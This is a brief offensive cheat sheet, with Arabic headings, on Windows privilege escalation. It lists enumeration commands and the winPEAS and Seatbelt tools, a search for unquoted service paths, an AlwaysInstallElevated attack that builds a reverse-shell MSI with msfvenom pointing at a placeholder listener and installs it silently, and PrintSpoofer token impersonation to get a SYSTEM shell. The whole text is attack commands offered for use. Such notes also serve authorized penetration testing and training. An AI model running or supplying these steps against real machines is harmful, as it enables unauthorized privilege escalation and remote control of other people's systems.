# Windows Privilege Escalation

## Enumeration سريع
```powershell
whoami /priv
whoami /groups
systeminfo
Get-WmiObject -Class win32_service | Select Name, StartMode, PathName
```

## أدوات أتمتة
```powershell
winPEAS.exe
.\Seatbelt.exe -group=all
```

## Unquoted Service Path
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
```

## AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## Token Impersonation (مع SeImpersonatePrivilege)
```powershell
# استخدام PrintSpoofer / JuicyPotato / RoguePotato حسب نسخة الويندوز
PrintSpoofer.exe -i -c cmd
```
